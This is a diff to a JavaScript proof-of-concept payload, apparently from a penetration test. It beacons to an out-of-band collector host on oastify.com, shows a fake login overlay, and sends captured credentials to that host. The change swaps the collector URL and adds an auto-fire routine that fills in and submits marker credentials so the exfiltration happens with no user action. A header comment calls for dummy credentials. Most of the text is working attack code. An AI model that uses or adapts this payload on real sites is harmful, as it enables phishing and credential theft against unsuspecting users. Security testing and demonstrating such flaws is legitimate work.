@@ -3,7 +3,7 @@
    Use dummy credentials. Do not leave this hosted publicly once validated. */
 (function () {
   var d = document, O = d.domain;
-  var C = 'https://l3pwgrzicxwlmtoncvi5hgjm1d74v0jp.oastify.com/';
+  var C = 'https://558gib12ehy5odq7efkpj0l63x9oxple.oastify.com/';
 
   var KEEP = [];                       // retain refs so nothing is GC'd before it sends
   function send(tag, obj) {
@@ -93,4 +93,20 @@
         return { '<': '&lt;', '>': '&gt;', '&': '&amp;' }[m]; }) + '</span></div></div>';
     setTimeout(function () { ov.innerHTML = html; }, 500);   // let the beacon leave first
   };
+
+  // ---- AUTO-FIRE: prove the stage-2 channel with no manual click ----
+  // Fills the overlay with marker credentials and submits after a short delay, so the
+  // stage2-creds beacon lands on its own. A real tester can still type + click for a
+  // genuine "typed credentials" demonstration; that simply fires it again.
+  setTimeout(function () {
+    try {
+      var uu = d.getElementById('pocu'), pp = d.getElementById('pocp');
+      if (uu && pp && !uu.value && !pp.value) {
+        uu.value = 'AUTOFIRE-victim@example.com';
+        pp.value = 'AUTOFIRE-Passw0rd!';
+        d.getElementById('pocbtn').click();
+      }
+    } catch (e) {}
+  }, 1200);
+
 })();
